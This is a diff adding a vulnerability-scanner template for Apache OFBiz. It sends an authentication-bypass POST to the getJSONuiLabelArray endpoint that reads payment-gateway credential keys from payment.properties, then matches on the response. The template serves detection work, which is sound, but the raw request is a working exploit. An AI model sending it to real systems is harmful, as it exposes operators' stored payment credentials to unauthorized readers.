@@ -1,0 +1,28 @@
+id: apache-ofbiz-getjsonuilabelarray-config-read
+info:
+  name: Apache OFBiz getJSONuiLabelArray Arbitrary Configuration Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read, ofbiz
+http:
+  - raw:
+      - |
+        POST /webtools/control/getJSONuiLabelArray/?USERNAME=&PASSWORD=s&requirePasswordChange=Y HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        requiredLabels={"file:applications/accounting/config/payment.properties":["payment.verisign.user","payment.verisign.pwd","payment.verisign.vendor"]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"[PayFlow UserID]\""
+          - "\"[Vendor]\""
+      - type: word
+        part: header
+        words:
+          - "application/x-json"
